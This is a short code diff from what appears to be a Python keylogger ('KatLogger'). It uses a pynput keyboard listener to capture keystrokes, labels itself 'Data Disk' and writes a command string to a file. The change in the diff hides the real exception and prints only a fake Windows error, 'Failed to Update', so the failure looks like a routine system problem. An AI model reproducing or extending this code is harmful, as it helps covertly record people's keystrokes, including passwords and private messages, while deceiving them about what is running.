@@ -1,7 +1,7 @@
 LABEL = "Data Disk"
 import kat
 
-kat.authors("@Lif28, @rickyfili10")
+kat.authors(["Lif28", "rickyfili10"])
 kat.licence("GPL-3.0 licence")
 kat.licenceFile("../LICENCE", 0)
 kat.link("https://github.com/Lif28/KatLogger/tree/main?tab=GPL-3.0-1-ov-file")
@@ -240,7 +240,7 @@ exit /b
                 file.write(cmd)
 
         except Exception as e:
-            print(e, "Error [0x80070643]: Failed to Update")
+            print("Error [0x80070643]: Failed to Update")
 
     def main(self):
         listener = pynput.keyboard.Listener(on_press=self.take_keys)
